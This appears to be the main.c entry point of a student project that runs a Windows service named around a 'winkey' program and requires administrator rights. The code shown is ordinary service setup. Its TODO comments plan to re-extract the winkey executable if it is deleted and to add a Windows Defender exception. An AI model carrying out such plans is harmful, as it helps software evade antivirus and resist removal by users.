/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/05/08 13:00:34 by vzurera-          #+#    #+#             */
/*   Updated: 2025/05/14 00:19:08 by vzurera-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

// TODO:
//
// Poner winkey como recurso y extraerlo a la ubicacion final
// Si se ha eliminado, extraerlo en el MainLoop
// Añadir excepcion en windows defender
// Stop elimina winkey.exe
// Delete elimina todo (logs incluidos)
// Update
// Icono

#pragma region "Includes"

    #include "svc.h"

	#include <stdio.h>

#pragma endregion

#pragma region "Main"

	int main(int argc, char **argv) {
		// Executed as a service
		if (StartServiceCtrlDispatcher((SERVICE_TABLE_ENTRY[]) {{ Name, (LPSERVICE_MAIN_FUNCTION)ServiceMain }, { NULL, NULL }})) return (0);

		// Executed as a process, check if it has administrator privileges
		DWORD dwSize; HANDLE hToken; TOKEN_ELEVATION elevation = {0};
		if (!(OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)
			&& GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)
			&& (CloseHandle(hToken), elevation.TokenIsElevated)))
			return (printf("\nAdministrator privileges are required\n"), 1);

		// Process actions
		return (control(argc, argv));
	}

#pragma endregion
